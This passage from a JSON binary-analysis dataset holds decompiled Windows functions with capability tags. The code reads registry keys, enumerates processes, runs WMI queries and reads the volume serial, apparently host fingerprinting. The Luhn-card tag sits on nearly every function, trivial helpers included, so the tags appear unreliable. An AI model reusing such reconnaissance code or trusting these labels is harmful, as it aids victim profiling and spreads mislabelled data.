= &fcn.0041e0c0::var_218h;\n        uStackY656 = 0x41e6e6;\n        (**0x463038)();\n        uStackY656 = 0x447b20;\n        puStackY660 = &fcn.0041e0c0::var_218h;\n        uStackY664 = 0x41e6f8;\n        (**0x463038)();\n        uStackY664 = 0x447b04;\n        puStackY668 = &fcn.0041e0c0::var_218h;\n        uStackY672 = 0x41e70a;\n        (**0x463038)();\n        uStackY672 = 0x447afc;\n        puStackY676 = &fcn.0041e0c0::var_218h;\n        uStackY680 = 0x41e71c;\n        (**0x463038)();\n        uStackY680 = 0x447b08;\n        puStackY684 = &fcn.0041e0c0::var_218h;\n        uStackY688 = 0x41e72e;\n        (**0x463038)();\n        uStackY688 = 0x447b10;\n        puStackY692 = &fcn.0041e0c0::var_218h;\n        uStackY696 = 0x41e740;\n        (**0x463038)();\n        uStackY696 = 0x447af8;\n        puStackY700 = &fcn.0041e0c0::var_218h;\n        uStackY704 = 0x41e752;\n        (**0x463038)();\n        uStackY704 = 0x447a40;\n        puStackY708 = &fcn.0041e0c0::var_218h;\n        uStackY712 = 0x41e764;\n        (**0x463038)();\n        fcn.00416940(0x4452bc, &fcn.0041e0c0::var_114h, &fcn.0041e0c0::var_31ch, 0x447aec);\n        fcn.00416940(0x4452bc, &fcn.0041e0c0::var_114h, &fcn.0041e0c0::var_218h, 0x447aec);\n        uStackY100808 = 0xf;\n        uStackY100812 = 0;\n        uStackY100828 = uStackY100828 & 0xffffff00;\n        uVar1 = fcn.0042ad20();\n        fcn.004062a0(0x447ae8, uVar1);\n        var_4h = 0;\n        puVar2 = fcn.00406490(&stack0xfffe7608, 0x447ae4, &stack0xfffe7624);\n        var_4h = CONCAT31(var_4h._1_3_, 1);\n        if (0xf < puVar2[5]) {\n            puVar2 = *puVar2;\n        }\n        fcn.00416940(0x4452bc, &fcn.0041e0c0::var_114h, puVar2, 0x447aec);\n        if (0xf < uStackY100836) {\n            fcn.0042a679();\n        }\n        uStackY100836 = 0xf;\n        uStackY100840 = 0;\n        uStackY100856 = uStackY100856 & 0xffffff00;\n        var_4h = 0xffffffff;\n        if (0xf < uStackY100808) {\n            fcn.0042a679();\n        }\n        uStackY100808 = 0xf;\n        uStackY100812 = 0;\n        uStackY100828 = uStackY100828 & 0xffffff00;\n        uVar1 = fcn.0042ad20();\n        fcn.004062a0(0x447ad8, uVar1);\n        var_4h = 2;\n        puVar2 = fcn.00406490(&stack0xfffe7608, 0x447acc, &stack0xfffe7624);\n        var_4h = CONCAT31(var_4h._1_3_, 3);\n        if (0xf < puVar2[5]) {\n            puVar2 = *puVar2;\n        }\n        fcn.00416940(0x4452bc, &fcn.0041e0c0::var_114h, puVar2, 0x447aec);\n        if (0xf < uStackY100836) {\n            fcn.0042a679();\n        }\n        uStackY100836 = 0xf;\n        uStackY100840 = 0;\n        uStackY100856 = uStackY100856 & 0xffffff00;\n        var_4h = 0xffffffff;\n        if (0xf < uStackY100808) {\n            fcn.0042a679();\n        }\n        uStackY100808 = 0xf;\n        uStackY100812 = 0;\n        uStackY100828 = uStackY100828 & 0xffffff00;\n        uVar1 = fcn.0042ad20();\n        fcn.004062a0(0x447ac0, uVar1);\n        var_4h = 4;\n        puVar2 = fcn.00406490(&stack0xfffe7608, 0x447ab4, &stack0xfffe7624);\n        var_4h = CONCAT31(var_4h._1_3_, 5);\n        if (0xf < puVar2[5]) {\n            puVar2 = *puVar2;\n        }\n        fcn.00416940(0x4452bc, &fcn.0041e0c0::var_114h, puVar2, 0x447aec);\n        if (0xf < uStackY100836) {\n            fcn.0042a679();\n        }\n        uStackY100836 = 0xf;\n        uStackY100840 = 0;\n        uStackY100856 = uStackY100856 & 0xffffff00;\n        var_4h = 0xffffffff;\n        if (0xf < uStackY100808) {\n            fcn.0042a679();\n        }\n        uStackY100864 = 0xf;\n        uStackY100868 = 0;\n        uStackY100884 = uStackY100884 & 0xffffff00;\n        uVar1 = fcn.0042ad20();\n        fcn.004062a0(0x447aa8, uVar1);\n        var_4h = 6;\n        puVar2 = fcn.00406490(&stack0xfffe75d0, 0x447a9c, &stack0xfffe75ec);\n        var_4h = CONCAT31(var_4h._1_3_, 7);\n        if (0xf < puVar2[5]) {\n            puVar2 = *puVar2;\n        }\n        fcn.00416940(0x4452bc, &fcn.0041e0c0::var_114h, puVar2, 0x447aec);\n        if (0xf < uStackY100892) {\n            fcn.0042a679();\n        }\n        uStackY100892 = 0xf;\n        uStackY100896 = 0;\n        uStackY100912 = uStackY100912 & 0xffffff00;\n        var_4h = 0xffffffff;\n        if (0xf < uStackY100864) {\n            fcn.0042a679();\n        }\n        uStackY100864 = 0xf;\n        uStackY100868 = 0;\n        uStackY100884 = uStackY100884 & 0xffffff00;\n        fcn.00416940(0x4452bc, &fcn.0041e0c0::var_114h, 0x447a90, 0x447aec);\n        var_114h = &fcn.0041e0c0::var_114h;\n        fcn.00416940(0x4452bc, var_114h, 0x447a88, 0x447aec);\n        fcn.00416940(0x4452bc, &fcn.0041e0c0::var_114h, 0x447a7c, 0x447aec);\n        fcn.00416940(0x4452bc, &fcn.0041e0c0::var_114h, 0x447a64, 0x447aec);\n        fcn.00416940(0x4452bc, &fcn.0041e0c0::var_114h, 0x447a4c, 0x447aec);\n        arg_8h_00 = 0x447aec;\n        fcn.00416940(0x4452bc, &fcn.0041e0c0::var_114h, 0x447a44, 0x447aec);\n    }\n    *(extraout_ECX + 0xc) = *0x45257c;\n    *(extraout_ECX + 0x10) = *0x452588;\n    uVar1 = (**0x462f30)();\n    fcn.00429a10(*(extraout_ECX + 0x20), *0x4521e0, &stack0xfffe7640, uVar1);\n    fcn.0042a6e0();\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 5978
    },
    "0041ebf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041ebf0(void)\n\n{\n    uint arg_8h;\n    uint uVar1;\n    uint var_14h;\n    ushort var_eh;\n    ushort var_ch;\n    ushort var_ah;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    arg_8h = (**0x463094)(0, 0x104);\n    uVar1 = (**0x46301c)();\n    (**0x462fc0)(&var_14h);\n    (**0x462e8c)(uVar1, 0x447b40, var_eh, var_14h._2_2_, var_14h, var_ch, var_ah, var_8h);\n    fcn.0042a75a(arg_8h);\n    return;\n}\n",
        "token_count": 210
    },
    "0041ed20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041ed20(void)\n\n{\n    int32_t iVar1;\n    uchar *arg_8h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uchar var_104h;\n    uint var_103h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    var_20ch = 0xff;\n    var_104h = 0;\n    fcn.0042a6e0(&var_103h, 0, 0xfe);\n    iVar1 = (**0x462f60)(0x80000002, 0x447b68, 0, 0x20119, &var_208h);\n    if (iVar1 == 0) {\n        (**0x462f44)(var_208h, 0x447b54, 0, 0, &var_104h, &var_20ch);\n    }\n    (**0x462fe8)(var_208h);\n    arg_8h = &var_104h;\n    (**0x462e9c)(arg_8h, &var_204h);\n    fcn.0042a75a(arg_8h);\n    return;\n}\n",
        "token_count": 286
    },
    "0041ede0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ede0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint var_c18h;\n    int32_t var_c14h;\n    uint var_c10h;\n    uint var_c0ch;\n    uint var_c08h;\n    uint var_c04h;\n    uint var_804h;\n    uint var_404h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    arg_8h_00 = 0;\n    var_c10h = 0;\n    var_c0ch = 0;\n    var_c18h = 0xf003f;\n    var_c08h = 0;\n    iVar1 = (**0x462f60)(0x80000002, 0x447bb8, 0, 0x20019, &var_c10h);\n    if (iVar1 == 0) {\n        var_c14h = 0;\n        do {\n            var_c08h = 0x400;\n            iVar1 = (**0x46308c)(var_c10h, var_c14h, &var_c04h, &var_c08h, 0, 0, 0, 0);\n            if (iVar1 == 0) {\n                (**0x462e8c)(&var_804h, 0x446d50, 0x447bb8, &var_c04h);\n                iVar2 = (**0x462f60)(0x80000002, &var_804h, 0, 0x20019, &var_c0ch);\n                if (iVar2 != 0) {\n                    (**0x462fe8)(var_c0ch);\n                    break;\n                }\n                var_c08h = 0x400;\n                iVar2 = (**0x462f44)(var_c0ch, 0x447bac, 0, &var_c18h, &var_404h, &var_c08h);\n                if (iVar2 == 0) {\n                    (**0x463038)(arg_8h, &var_404h);\n                    var_c08h = 0x400;\n                    iVar2 = (**0x462f44)(var_c0ch, 0x447b9c, 0, &var_c18h, &var_404h, &var_c08h);\n                    if (iVar2 == 0) {\n                        (**0x463038)(arg_8h, 0x446f2c);\n                        (**0x463038)(arg_8h, &var_404h);\n                        (**0x463038)(arg_8h, 0x447b98);\n                    }\n                    (**0x463038)(arg_8h, 0x4452fc);\n                }\n                (**0x462fe8)(var_c0ch);\n            }\n            var_c14h = var_c14h + 1;\n        } while (iVar1 == 0);\n        (**0x462fe8)(var_c10h);\n    }\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 709
    },
    "0041f0c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041f0c0(void)\n\n{\n    int32_t iVar1;\n    uchar *arg_8h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uchar var_104h;\n    uint var_103h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    var_20ch = 0xff;\n    var_104h = 0;\n    fcn.0042a6e0(&var_103h, 0, 0xfe);\n    iVar1 = (**0x462f60)(0x80000002, 0x447c08, 0, 0x20119, &var_208h);\n    if (iVar1 == 0) {\n        (**0x462f44)(var_208h, 0x447bfc, 0, 0, &var_104h, &var_20ch);\n    }\n    (**0x462fe8)(var_208h);\n    arg_8h = &var_104h;\n    (**0x462e9c)(arg_8h, &var_204h);\n    fcn.0042a75a(arg_8h);\n    return;\n}\n",
        "token_count": 288
    },
    "0041f260": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041f260(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t arg_8h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    uVar1 = (**0x463094)(0, 500);\n    uVar1 = (**0x46301c)(uVar1);\n    iVar6 = 0;\n    iVar2 = (**0x463008)(0, 0);\n    arg_8h = iVar2 * 4;\n    iVar3 = (**0x462fe0)(0x40);\n    uVar4 = (**0x463008)(iVar2, iVar3);\n    uVar5 = 0;\n    if (uVar4 != 0) {\n        do {\n            (**0x462f04)(*(iVar3 + uVar5 * 4), 2, &var_204h, 0x200);\n            if (iVar6 == 0) {\n                (**0x462e8c)(uVar1, 0x446ed8, &var_204h);\n            }\n            else {\n                (**0x462e8c)(uVar1, 0x447c40, uVar1, &var_204h);\n            }\n            iVar6 = iVar6 + 1;\n            fcn.0042a6e0(&var_204h, 0, 0x200);\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < uVar4);\n    }\n    if (iVar3 != 0) {\n        (**0x4630e0)(iVar3);\n    }\n    fcn.0042a75a(arg_8h);\n    return;\n}\n",
        "token_count": 443
    },
    "0041f380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041f380(uint arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    ulong uVar6;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    uVar5 = 0;\n    var_4h = NULL;\n    uVar2 = (**0x44018c)(0x448a18, 0, 1, 0x447c48, &var_4h);\n    if (-1 < uVar2) {\n        iVar3 = (**0x44017c)(arg_8h);\n        if (iVar3 != 0) {\n            iVar4 = (**(*var_4h + 0x20))(var_4h, iVar3);\n            pcVar1 = *0x440170;\n            if (-1 < iVar4) {\n                iVar4 = (**(*var_4h + 0xb4))(var_4h, -(arg_10h != '\\0'), &var_8h);\n                if (-1 < iVar4) {\n                    uVar6 = fcn.0042e42f(var_8h);\n                    arg_ch[1] = uVar6 >> 0x20;\n                    *arg_ch = uVar6;\n                    uVar5 = 1;\n                    (*pcVar1)(var_8h);\n                }\n            }\n            (*pcVar1)(iVar3);\n        }\n        uVar2 = (**(*var_4h + 8))(var_4h);\n    }\n    return uVar2 & 0xffffff00 | uVar5;\n}\n",
        "token_count": 385
    },
    "0041f430": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f430(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint var_154h;\n    uint var_14ch;\n    uint var_130h;\n    uint32_t var_2ch;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43eb38;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h_00 = 0;\n    var_154h = 0x128;\n    uVar1 = (**0x46307c)(2, 0, var_10h);\n    iVar2 = (**0x462eec)(uVar1, &var_154h);\n    if (iVar2 != 0) {\n        iVar2 = (**0x462fc4)(uVar1, &var_154h);\n        while (iVar2 != 0) {\n            (**0x463038)(arg_8h, 0x447c58);\n            (**0x463038)(arg_8h, &var_130h);\n            (**0x463038)(arg_8h, 0x446f2c);\n            puVar3 = fcn.00423fe0(&var_2ch, var_14ch);\n            var_4h = 0;\n            if (0xf < puVar3[5]) {\n                puVar3 = *puVar3;\n            }\n            (**0x463038)(arg_8h, puVar3);\n            var_4h = 0xffffffff;\n            if (0xf < var_18h) {\n                fcn.0042a679(var_2ch);\n            }\n            var_18h = 0xf;\n            var_1ch = 0;\n            var_2ch = var_2ch & 0xffffff00;\n            (**0x463038)(arg_8h, 0x446f28);\n            iVar2 = (**0x462fc4)(uVar1, &var_154h);\n        }\n    }\n    (**0x462ed0)(uVar1);\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 585
    },
    "0041f560": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041f560(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint arg_8h;\n    uint32_t uStack128;\n    uint var_6ch;\n    uint var_64h;\n    uint var_5ch;\n    int32_t var_54h;\n    int32_t *var_50h;\n    int32_t *var_4ch;\n    int32_t *var_48h;\n    int32_t *var_44h;\n    uint32_t var_40h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint var_24h;\n    ushort var_1eh;\n    ushort var_1ch;\n    ushort var_1ah;\n    uint var_18h;\n    uint32_t var_14h_2;\n    uint32_t *puStack20;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43eb70;\n    var_ch_2 = *in_FS_OFFSET;\n    uStack128 = *0x4506f0 ^ &stack0xfffffffc;\n    puStack20 = &uStack128;\n    *in_FS_OFFSET = &var_ch_2;\n    var_4h._0_1_ = 0;\n    var_4h._1_3_ = 0;\n    var_14h_2 = uStack128;\n    (**0x440194)(0, 0);\n    (**0x440190)(0, 0xffffffff, 0, 0, 0, 3, 0, 0, 0);\n    var_50h = NULL;\n    (**0x44018c)(0x448c68, 0, 1, 0x448b98, &var_50h);\n    arg_8h = 0;\n    var_44h = NULL;\n    iVar1 = (**(*var_50h + 0xc))(var_50h, 0x447cc8, 0, 0, 0, 0, 0, 0, &var_44h);\n    if (-1 < iVar1) {\n        (**0x440198)(var_44h, 10, 0, 0, 3, 3, 0, 0);\n        var_4ch = NULL;\n        iVar1 = (**(*var_44h + 0x50))(var_44h, 0x447c74, 0x447c80, 0x20, 0, &var_4ch);\n        if (-1 < iVar1) {\n            var_48h = NULL;\n            var_54h = 0;\n            var_2ch = 0xf;\n            var_30h = 0;\n            var_40h = var_40h & 0xffffff00;\n            var_4h._0_1_ = 1;\n            if (var_4ch != NULL) {\n                (**(*var_4ch + 0x10))(var_4ch, 0xffffffff, 1, &var_48h, &var_54h);\n                if (var_54h == 0) {\n                    if (0xf < var_2ch) {\n                        fcn.0042a679(var_40h);\n                    }\n                }\n                else {\n                    (**0x440178)(&var_64h);\n                    var_4h._0_1_ = 2;\n                    (**(*var_48h + 0x10))(var_48h, 0x447c5c, 0, &var_64h, 0, 0);\n                    fcn.0041f380(var_5ch, &var_6ch, 1);\n                    (**0x4630cc)(&var_6ch, &var_24h);\n                    uVar2 = (**0x463094)();\n                    uVar2 = (**0x46301c)(uVar2, 0, 0x104);\n                    (**0x462e8c)(uVar2, 0x447b40, var_1eh, var_24h._2_2_, var_24h, var_1ch, var_1ah, var_18h);\n                    (**0x440174)(&var_64h);\n                    fcn.00405d10();\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0042a75a(arg_8h);\n    return;\n}\n",
        "token_count": 1034
    },
    "0041f740": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f740(int32_t **arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t arg_10h;\n    int32_t **ppiVar2;\n    int32_t **in_ECX;\n    \n    if (arg_8h != NULL) {\n        piVar1 = in_ECX[5];\n        ppiVar2 = in_ECX;\n        if (0x7 < piVar1) {\n            ppiVar2 = *in_ECX;\n        }\n        if (ppiVar2 <= arg_8h) {\n            ppiVar2 = in_ECX;\n            if (0x7 < piVar1) {\n                ppiVar2 = *in_ECX;\n            }\n            if (arg_8h < ppiVar2 + in_ECX[4] * 2) {\n                ppiVar2 = in_ECX;\n                if (0x7 < piVar1) {\n                    ppiVar2 = *in_ECX;\n                }\n                fcn.00412860(in_ECX, arg_8h - ppiVar2 >> 1, arg_ch);\n                return;\n            }\n        }\n    }\n    if (0x7ffffffe < arg_ch) {\n        fcn.00429b7e(0x4452ec);\n    }\n    if (in_ECX[5] < arg_ch) {\n        fcn.004126e0(arg_ch, in_ECX[4]);\n        if (arg_ch == NULL) {\n            return;\n        }\n    }\n    else if (arg_ch == NULL) {\n        in_ECX[4] = NULL;\n        if (0x7 < in_ECX[5]) {\n            **in_ECX = 0;\n            return;\n        }\n        *in_ECX = 0;\n        return;\n    }\n    ppiVar2 = in_ECX;\n    if (0x7 < in_ECX[5]) {\n        ppiVar2 = *in_ECX;\n    }\n    arg_10h = arg_ch * 2;\n    fcn.0042a840(ppiVar2, arg_8h, arg_10h);\n    in_ECX[4] = arg_ch;\n    if (in_ECX[5] < 0x8) {\n        *(arg_10h + in_ECX) = 0;\n        return;\n    }\n    *(arg_10h + *in_ECX) = 0;\n    return;\n}\n",
        "token_count": 543
    },
    "0041f830": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f830(uint arg_8h)\n\n{\n    uint arg_ch;\n    ushort *in_ECX;\n    \n    *(in_ECX + 10) = 7;\n    *(in_ECX + 8) = 0;\n    *in_ECX = 0;\n    arg_ch = fcn.0042e2d3(arg_8h);\n    fcn.0041f740(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 104
    },
    "0041f870": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f870(uchar *arg_8h)\n\n{\n    uint *arg_8h_00;\n    uint arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint var_58h;\n    uint var_44h;\n    uint var_34h;\n    uint var_2ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43eba8;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_34h = 0;\n    (**0x462f24)(&var_58h, var_10h);\n    arg_8h_00 = fcn.00423fe0(&var_2ch, var_44h);\n    var_4h = 0;\n    if (0xf < arg_8h_00[5]) {\n        arg_8h_00 = *arg_8h_00;\n    }\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042ad20(arg_8h_00);\n    fcn.004062a0(arg_8h_00, arg_ch);\n    if (0xf < var_18h) {\n        fcn.0042a679(var_2ch);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(var_44h);\n    return;\n}\n",
        "token_count": 402
    },
    "0041f930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f930(uchar *arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_ch;\n    uint *arg_8h_00;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    iVar1 = (**0x462e88)(&var_80h);\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    if (iVar1 == 0) {\n        arg_ch = fcn.0042ad20(0x447bf4);\n        arg_8h_00 = 0x447bf4;\n    }\n    else {\n        arg_ch = fcn.0042ad20(&var_7ch);\n        arg_8h_00 = &var_7ch;\n    }\n    fcn.004062a0(arg_8h_00, arg_ch);\n    fcn.0042a75a(arg_ch);\n    return;\n}\n",
        "token_count": 268
    },
    "0041f9b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f9b0(uchar *arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_ch;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uchar var_104h;\n    uint var_103h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    var_208h = 0xff;\n    var_104h = 0;\n    fcn.0042a6e0(&var_103h, 0, 0xfe);\n    iVar1 = (**0x462f60)(0x80000002, 0x447cec, 0, 0x20119, &var_20ch);\n    if (iVar1 == 0) {\n        (**0x462f44)(var_20ch, 0x447ce0, 0, 0, &var_104h, &var_208h);\n    }\n    (**0x462fe8)(var_20ch);\n    (**0x462e9c)(&var_104h, &var_204h);\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042ad20(&var_204h);\n    fcn.004062a0(&var_204h, arg_ch);\n    fcn.0042a75a(arg_ch);\n    return;\n}\n",
        "token_count": 356
    },
    "0041fab0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041fab0(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint arg_8h;\n    uint32_t uStack164;\n    uint var_90h;\n    uint var_88h;\n    int32_t *var_80h;\n    int32_t *var_7ch;\n    int32_t *var_78h;\n    int32_t var_74h;\n    int32_t *var_70h;\n    uint var_68h;\n    uint var_4ch;\n    uint32_t var_30h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint32_t var_14h_2;\n    uint32_t *puStack20;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43ebeb;\n    var_ch_2 = *in_FS_OFFSET;\n    uStack164 = *0x4506f0 ^ &stack0xfffffffc;\n    puStack20 = &uStack164;\n    *in_FS_OFFSET = &var_ch_2;\n    var_4h._0_1_ = 0;\n    var_4h._1_3_ = 0;\n    var_14h_2 = uStack164;\n    (**0x440194)(0, 0);\n    (**0x440190)(0, 0xffffffff, 0, 0, 0, 3, 0, 0, 0);\n    var_7ch = NULL;\n    (**0x44018c)(0x448c68, 0, 1, 0x448b98, &var_7ch);\n    arg_8h = 0;\n    var_70h = NULL;\n    iVar1 = (**(*var_7ch + 0xc))(var_7ch, 0x447d64, 0, 0, 0, 0, 0, 0, &var_70h);\n    if (-1 < iVar1) {\n        (**0x440198)(var_70h, 10, 0, 0, 3, 3, 0, 0);\n        var_78h = NULL;\n        iVar1 = (**(*var_70h + 0x50))(var_70h, 0x447c74, 0x447d24, 0x20, 0, &var_78h);\n        if (-1 < iVar1) {\n            var_80h = NULL;\n            var_74h = 0;\n            var_1ch = 0xf;\n            var_20h = 0;\n            var_30h = var_30h & 0xffffff00;\n            var_4h._0_1_ = 1;\n            if (var_78h != NULL) {\n                (**(*var_78h + 0x10))(var_78h, 0xffffffff, 1, &var_80h, &var_74h);\n                if (var_74h == 0) {\n                    if (0xf < var_1ch) {\n                        fcn.0042a679(var_30h);\n                    }\n                }\n                else {\n                    (**0x440178)(&var_90h);\n                    var_4h._0_1_ = 2;\n                    (**(*var_80h + 0x10))(var_80h, 0x447d0c, 0, &var_90h, 0, 0);\n                    fcn.0041f830(var_88h);\n                    var_4h._0_1_ = 3;\n                    fcn.00423cb0(&var_68h, &var_4ch);\n                    fcn.00405d10();\n                    fcn.0040bb00();\n                    (**0x440174)(&var_90h);\n                    fcn.00405d10();\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0042a75a(arg_8h);\n    return;\n}\n",
        "token_count": 934
    },
    "0041fcd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041fcd0(uint8_t **arg_8h)\n\n{\n    uchar uVar1;\n    uint8_t uVar2;\n    ushort uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t *arg_10h;\n    uint uVar6;\n    uint8_t **ppuVar7;\n    uint *puVar8;\n    int32_t *in_FS_OFFSET;\n    uint *puVar9;\n    uint var_1ech;\n    uint *var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint32_t var_1c4h;\n    uint32_t var_1bch;\n    uint var_1ach;\n    uint32_t var_1a8h;\n    uint32_t var_1a0h;\n    uint var_190h;\n    uint32_t var_18ch;\n    uint32_t var_184h;\n    uint var_174h;\n    uint32_t var_170h;\n    uint32_t var_168h;\n    uint var_158h;\n    uint32_t var_154h;\n    uint32_t var_14ch;\n    uint var_140h;\n    uint32_t var_13ch;\n    ushort var_138h;\n    uint var_136h;\n    uint *var_130h;\n    uint8_t *var_120h;\n    uint8_t *var_11ch;\n    uint var_114h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43ec6d;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_1dch = 0;\n    var_11ch = 0xf;\n    var_120h = NULL;\n    var_130h = var_130h & 0xffffff00;\n    var_4h = 0;\n    iVar4 = (**0x462f1c)(&var_114h, 0x104, var_10h);\n    if (iVar4 == 0) {\n        var_114h._0_1_ = 0x43;\n    }\n    puVar9 = NULL;\n    var_1e0h._0_1_ = var_114h;\n    var_1e0h._1_2_ = 0x5c3a;\n    var_1e0h._3_1_ = 0;\n    (**0x462e6c)(&var_1e0h, 0, 0, &var_1dch, 0, 0, 0, 0);\n    var_140h = fcn.00420810(&var_1dch);\n    uVar3 = fcn.00420810(&var_1dch);\n    var_13ch = CONCAT22(var_13ch._2_2_, uVar3);\n    fcn.00420810(&var_1dch);\n    iVar4 = 0;\n    do {\n        uVar1 = fcn.00420810(&var_1dch);\n        *(&var_138h + iVar4) = uVar1;\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 8);\n    uVar5 = (**0x463094)(0, 0x104);\n    iVar4 = (**0x46301c)(uVar5);\n    if (iVar4 == 